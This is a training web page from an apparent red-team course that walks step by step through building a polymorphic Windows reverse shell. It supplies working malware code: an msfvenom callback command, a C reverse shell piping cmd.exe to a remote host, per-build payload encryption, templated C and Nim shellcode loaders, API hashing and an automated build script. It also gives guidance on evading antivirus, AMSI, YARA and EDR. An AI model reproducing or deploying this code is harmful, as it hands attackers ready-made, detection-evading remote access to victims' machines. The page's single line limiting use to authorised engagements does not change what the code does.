---
layout: training-page
title: "Polymorphic Reverse Shell (Windows) — Red Team Academy"
module: "Evasion"
tags:
  - reverse-shell
  - polymorphism
  - windows
  - evasion
  - crypter
  - shellcode
  - nim
  - csharp
page_key: "evasion-polymorphic-reverse-shell"
render_with_liquid: false
---

# Building a Polymorphic Reverse Shell for Windows

A **polymorphic** payload mutates its on-disk and in-memory representation on every build while preserving the underlying functionality. Against signature-based AV and static YARA rules, every build looks like a brand-new binary: different entropy profile, different instruction sequences, different strings, different import order, different encrypted blob.

Polymorphism is **not** a single trick. It is a build pipeline that stacks several independent mutations so that no byte region is stable across builds. This page walks through every layer of that pipeline and then wires them together into a working Windows reverse shell generator.

Keep this strictly on authorized engagements, CTF labs, and your own VMs.

## The Layers of Polymorphism

A production-grade polymorphic reverse shell typically stacks these layers:

1. **Payload generation** — the raw shellcode or managed payload that gives you the callback.
2. **Encryption layer** — per-build random key and algorithm that encrypts the payload.
3. **Stub mutation** — the decoder/loader stub is regenerated each build with different source.
4. **Source-level obfuscation** — identifier renaming, dead code, instruction substitution, control-flow flattening.
5. **Import and metadata randomization** — API resolution via hashing so the IAT does not reveal intent.
6. **Transport variation** — TCP, HTTPS, DNS, WebSocket, or named pipes, chosen per build.
7. **Compilation diversity** — different compilers, flags, section names, timestamps.
8. **Delivery wrapper** — packer, dropper, or HTML smuggling that re-seals the final artifact.

Each layer alone is weak. Stacked, they defeat static detection entirely and force the defender onto behavioural/EDR telemetry, which you then address with separate techniques (see `/evasion/sleep-obfuscation/`, `/evasion/indirect-syscalls/`, `/evasion/etw-bypass/`).

## Layer 1 — Payload Generation

Start with a clean raw payload. Two options:

**Option A — Metasploit shellcode**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o shell.bin
```

**Option B — Donut (convert any PE/DLL/.NET assembly to position-independent shellcode)**

```
donut -f 1 -a 2 -b 1 -i implant.exe -o shell.bin
```

`donut` lets you start from a full C#/PowerShell implant and collapse it into raw shellcode your polymorphic loader can wrap.

**Option C — Custom socket shell**

Write your own minimal reverse shell in C that calls `WSAStartup`, `WSASocketA`, `WSAConnect`, and `CreateProcessA` with `cmd.exe` and the socket as `hStdInput/Output/Error`. Compile to shellcode with `donut` or extract from a `.text` section. Custom shellcode removes the Metasploit signature entirely.

```c
// mini_revshell.c — compile with cl.exe then donut to shellcode
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    SOCKADDR_IN addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("10.10.14.5");
    WSAConnect(s, (SOCKADDR *)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
```

Whatever you choose, the result of Layer 1 is a **stable blob** (`shell.bin`) that does the callback. Every build of the polymorphic loader will wrap this blob differently.

## Layer 2 — Per-Build Encryption

The encryption layer is the core of polymorphism: every build generates a **new random key** and **new random algorithm parameters**, so the encrypted blob never has the same bytes twice.

### Rotating algorithms

Pick randomly per build from a menu:

- XOR with a multi-byte key
- RC4 with random key
- AES-128-CBC with random key and IV
- ChaCha20 with random key and nonce
- Custom ADD/SUB/ROL stream cipher

Each algorithm has its own stub. The build script picks one, encrypts the payload, and emits the matching stub source.

### Example — build-time encryption in Python

```python
# encrypt_payload.py
import os, sys, random
from Crypto.Cipher import AES, ARC4
from Crypto.Util.Padding import pad

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def rc4(data, key):
    return ARC4.new(key).encrypt(data)

def aes(data, key, iv):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data, 16))

with open("shell.bin", "rb") as f:
    sc = f.read()

algo = random.choice(["xor", "rc4", "aes"])
if algo == "xor":
    key = os.urandom(random.randint(8, 32))
    enc = xor(sc, key)
    params = {"key": key}
elif algo == "rc4":
    key = os.urandom(16)
    enc = rc4(sc, key)
    params = {"key": key}
else:
    key = os.urandom(16)
    iv = os.urandom(16)
    enc = aes(sc, key, iv)
    params = {"key": key, "iv": iv}

print(f"[+] Algorithm: {algo}")
print(f"[+] Key: {params['key'].hex()}")
with open("payload.enc", "wb") as f:
    f.write(enc)
with open("meta.txt", "w") as f:
    f.write(algo + "\n")
    for k, v in params.items():
        f.write(f"{k}={v.hex()}\n")
```

Every run produces a different algorithm, different key, and therefore a completely different encrypted blob. A YARA signature written against one build will not match the next.

## Layer 3 — Stub Mutation via Templates

The **stub** is the small decoder that lives inside the final EXE, receives the encrypted blob and key, decrypts in memory, and transfers execution. To stay polymorphic, the stub source must be regenerated per build using a template engine (Jinja2 is perfect for this).

### Jinja2 loader template (C, XOR variant)

```python
# render_stub.py
from jinja2 import Template
import random, string

def rand_name(n=10):
    return ''.join(random.choices(string.ascii_letters, k=n))

def to_c_array(b):
    return ','.join(f"0x{x:02x}" for x in b)

TEMPLATE = r"""
#include <windows.h>
#include <stdio.h>

unsigned char {{ blob_var }}[] = { {{ blob }} };
unsigned char {{ key_var }}[]  = { {{ key }} };
size_t {{ size_var }} = {{ size }};

void {{ decrypt_fn }}(unsigned char *b, size_t n, unsigned char *k, size_t kl) {
    for (size_t {{ i_var }} = 0; {{ i_var }} < n; {{ i_var }}++) {
        b[{{ i_var }}] ^= k[{{ i_var }} % kl];
    }
}

int main(void) {
    {{ junk_1 }}
    void *{{ mem_var }} = VirtualAlloc(NULL, {{ size_var }},
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!{{ mem_var }}) return 1;
    {{ junk_2 }}
    RtlCopyMemory({{ mem_var }}, {{ blob_var }}, {{ size_var }});
    {{ decrypt_fn }}({{ mem_var }}, {{ size_var }}, {{ key_var }}, sizeof({{ key_var }}));
    DWORD {{ old_var }};
    VirtualProtect({{ mem_var }}, {{ size_var }}, PAGE_EXECUTE_READ, &{{ old_var }});
    {{ junk_3 }}
    ((void(*)()){{ mem_var }})();
    return 0;
}
"""

def junk():
    choices = [
        f"volatile int {rand_name()} = {random.randint(1, 9999)};",
        f"char {rand_name()}[{random.randint(4,32)}] = {{0}};",
        f"for (int {rand_name(3)} = 0; {rand_name(3)} < 0; {rand_name(3)}++) {{}}",
        f"Sleep({random.randint(0, 3)});",
    ]
    return random.choice(choices)

with open("payload.enc", "rb") as f:
    enc = f.read()
with open("meta.txt") as f:
    lines = f.read().strip().splitlines()
algo = lines[0]
key = bytes.fromhex(lines[1].split("=")[1])

ctx = {
    "blob_var":    rand_name(),
    "key_var":     rand_name(),
    "size_var":    rand_name(),
    "decrypt_fn":  rand_name(),
    "i_var":       rand_name(3),
    "mem_var":     rand_name(),
    "old_var":     rand_name(),
    "blob":        to_c_array(enc),
    "key":         to_c_array(key),
    "size":        len(enc),
    "junk_1":      junk(),
    "junk_2":      junk(),
    "junk_3":      junk(),
}

print(Template(TEMPLATE).render(**ctx))
```

Every render produces:

- Different variable and function names
- Different junk statements in different positions
- A different encrypted blob and key embedded as C arrays
- A slightly different control flow due to junk placement

Extend the template library with parallel templates for RC4 and AES variants. The build script picks the template that matches the algorithm selected in Layer 2.

## Layer 4 — Source-Level Obfuscation

On top of the template, apply further mutations:

**Instruction substitution.** Replace equivalent sequences:

- `x = 0;` ↔ `x = a ^ a;`
- `x += 1;` ↔ `x = x - (-1);`
- `if (a == b)` ↔ `if (!(a ^ b))`

**String obfuscation.** Never store `"VirtualAlloc"` literally. Build it at runtime:

```c
char s[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
```

Or store XOR-encrypted and decrypt with a per-build key.

**Control-flow flattening.** Wrap the main body in a switch-based state machine so straight-line code becomes a dispatch loop. Tools: `obfuscator-llvm`, `Tigress`.

**Dead branches.** Insert opaque predicates — conditions that always evaluate the same but the compiler cannot prove it, forcing real emitted code in both branches.

```c
int {{ opaque }} = {{ rand_val }};
if (({{ opaque }} * {{ opaque }}) % 2 == 0) {
    // real code
} else {
    // dead code path, never taken but emitted
    MessageBeep({{ rand_val }});
}
```

## Layer 5 — API Hashing (Dynamic Import Resolution)

If your EXE's Import Address Table lists `VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`, static scanners flag it immediately. The fix is **API hashing**: resolve functions at runtime by walking the PEB, hashing export names, and comparing against a precomputed hash.

```c
// simplified API hashing loader
#include <windows.h>

DWORD djb2(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

FARPROC resolve(HMODULE mod, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)mod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)mod +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD *)((BYTE *)mod + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)((BYTE *)mod + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)mod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)((BYTE *)mod + names[i]);
        if (djb2(name) == hash) {
            return (FARPROC)((BYTE *)mod + funcs[ords[i]]);
        }
    }
    return NULL;
}
```

Hash `VirtualAlloc` at **build time** and embed only the `DWORD` hash in the binary. No string, no import. Rotate the hash function per build (djb2, fnv1a, CRC32, sdbm) to prevent signatures on the hash constants themselves.

## Layer 6 — Transport Variation

The callback mechanism should be selectable per build so network IDS cannot rely on a single protocol signature:

- **TCP raw** — `WSAConnect` with `cmd.exe` piped to the socket (simplest, loudest)
- **HTTPS** — `WinHttpOpen` / `WinHttpSendRequest`, blends into normal web traffic
- **DNS** — `DnsQuery_A` with TXT records, works through many egress filters
- **Named pipe** — for lateral callbacks inside a network
- **WebSocket** — for egress past inspecting proxies

The build script picks one and swaps in the corresponding transport module. Beacon jitter (`Sleep(random_ms)`) and randomised User-Agents prevent traffic-pattern signatures.

For HTTPS specifically, include **domain fronting** or **redirector** support and rotate the SNI and Host header per build.

## Layer 7 — Compilation Diversity

Two builds of the same C source with the same compiler produce identical binaries. Force divergence:

```
:: randomize MSVC flags per build
cl.exe /O{{ opt_level }} /GS- /Gy /Fa /DRNG={{ rand_seed }} loader.c /link ^
  /SUBSYSTEM:CONSOLE /FILEALIGN:{{ align }} /MERGE:.rdata=.text
```

Vary:

- Optimization level (`/O1`, `/O2`, `/Ox`)
- Section merging
- File alignment
- PE timestamp (`link.exe /TIMESTAMP`)
- Section names (rename `.text` to `.code`, `.rdata` to `.str`)

For maximum divergence, rotate the **compiler itself**: MSVC, MinGW GCC, Clang, and — even better — cross-compile the loader from a different language per build.

**Nim** is the sweet spot: C-like performance, trivial Win32 FFI, each compile produces meaningfully different output, and Nim shellcode loaders have very few public signatures.

```nim
# loader.nim — Nim polymorphic loader skeleton
import winim/lean

const encPayload = staticRead("payload.enc")
const xorKey = [byte 0x{{ k0 }}, 0x{{ k1 }}, 0x{{ k2 }}, 0x{{ k3 }}]

proc {{ dec_name }}(buf: var seq[byte]) =
  for i in 0 ..< buf.len:
    buf[i] = buf[i] xor xorKey[i mod xorKey.len]

when isMainModule:
  var sc = cast[seq[byte]](@encPayload)
  {{ dec_name }}(sc)
  let mem = VirtualAlloc(nil, sc.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  copyMem(mem, addr sc[0], sc.len)
  var old: DWORD
  discard VirtualProtect(mem, sc.len, PAGE_EXECUTE_READ, addr old)
  cast[proc() {.cdecl.}](mem)()
```

Compile with `nim c -d:release -d:mingw --app:console --cpu:amd64 loader.nim`.

## Layer 8 — Delivery Wrapper

Once you have the polymorphic EXE, wrap it:

- **UPX** with custom section names (`upx --force --compress-exports=0 loader.exe`) — weak but cheap
- **Custom crypter** that decrypts the EXE into memory and runs it via `NtCreateSection` + `NtMapViewOfSection` or reflective loading
- **HTML smuggling** page that reassembles the EXE client-side (see `/evasion/html-smuggling/`)
- **ISO/IMG container** to avoid Mark-of-the-Web (see `/evasion/smartscreen-motw/`)

## The Full Build Pipeline

Tie every layer together in a single script so one command produces a fresh polymorphic shell each run:

```bash
#!/bin/bash
# build_poly_shell.sh
set -e

OUT_DIR="build/$(date +%s)_$RANDOM"
mkdir -p "$OUT_DIR"
cd "$OUT_DIR"

# 1. Generate raw shellcode
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST="$LHOST" LPORT="$LPORT" -f raw -o shell.bin

# 2. Encrypt with random algorithm + key
python3 ../../encrypt_payload.py

# 3. Render loader stub from matching template
python3 ../../render_stub.py > loader.c

# 4. Pick compiler + flags randomly
COMPILERS=("x86_64-w64-mingw32-gcc" "clang --target=x86_64-w64-mingw32")
CC=${COMPILERS[$RANDOM % ${#COMPILERS[@]}]}
OPTS=("-O1" "-O2" "-Os")
OPT=${OPTS[$RANDOM % ${#OPTS[@]}]}

# 5. Compile with random section names
$CC $OPT -s -Wl,--strip-all -o loader.exe loader.c -lws2_32

# 6. Optional: re-seal with crypter
# python3 ../../crypter.py loader.exe packed.exe

echo "[+] Built: $OUT_DIR/loader.exe"
sha256sum loader.exe
```

Run it ten times in a row and diff the resulting binaries — every hash should be unique, every section should differ, and every YARA rule written against build N should miss build N+1.

## Testing for Genuine Polymorphism

A polymorphic pipeline is only real if it survives measurement:

```
# Quick entropy / diff sanity check
for i in 1 2 3 4 5; do ./build_poly_shell.sh; done
sha256sum build/*/loader.exe             # all unique
ssdeep -pg build/*/loader.exe            # fuzzy hashes should diverge
radiff2 -s build/1/loader.exe build/2/loader.exe   # similarity score
```

Then test against real defenders in **isolated lab VMs** you control:

- **Windows Defender** — copy the sample, trigger on-demand scan, check detection
- **AMSI** — use `amsi.dll` test harness for in-memory scans
- **YARA rule sweep** — run your own rule pack (see `/evasion/malware-dev/`)
- **EDR sandbox** — vendor-provided eval VMs; never upload to VirusTotal (it shares samples with every vendor, killing your build's lifespan)

If a build detects, **do not patch blindly**. Bisect which layer failed (encrypted blob signature? import table? entropy heuristic? behavioural rule?) and mutate that layer more aggressively.

## Where Polymorphism Ends

Polymorphism defeats **static** detection. It does not help against:

- Behavioural detection on `VirtualAlloc → WriteProcessMemory → CreateThread` sequences
- ETW kernel callbacks on image load or thread creation
- AMSI inspection of decrypted content at the moment of execution
- Sandbox detonation (the decrypted payload behaves identically every time)

Pair this page with:

- `/evasion/indirect-syscalls/` — bypass user-mode EDR hooks
- `/evasion/sleep-obfuscation/` — hide the decrypted payload during Sleep
- `/evasion/etw-bypass/` — blind user-mode ETW
- `/evasion/amsi-bypass/` — patch AMSI in the loader before decryption
- `/evasion/stack-spoofing/` — hide the call stack of the shellcode entry

Polymorphism is the **static** layer of a defense-in-depth evasion strategy. It buys you past the signature gate. Everything that comes next is a separate problem.

## Resources

- Donut (shellcode generator) — `github.com/TheWover/donut`
- ScareCrow (EDR evasion loader) — `github.com/optiv/ScareCrow`
- Shellter (dynamic shellcode injector) — `github.com/ParrotSec/shellter`
- Veil-Framework — `github.com/Veil-Framework/Veil`
- Nim for offensive security — `github.com/byt3bl33d3r/OffensiveNim`
- obfuscator-llvm — `github.com/obfuscator-llvm/obfuscator`
- Tigress C obfuscator — `tigress.wtf`
- Sektor7 "Malware Development Intermediate" course notes — see `/evasion/malware-dev/`
- "Writing a Custom Shellcode Encoder" — `blog.didierstevens.com`
- API hashing reference — `github.com/vxunderground/VXUG-Papers`
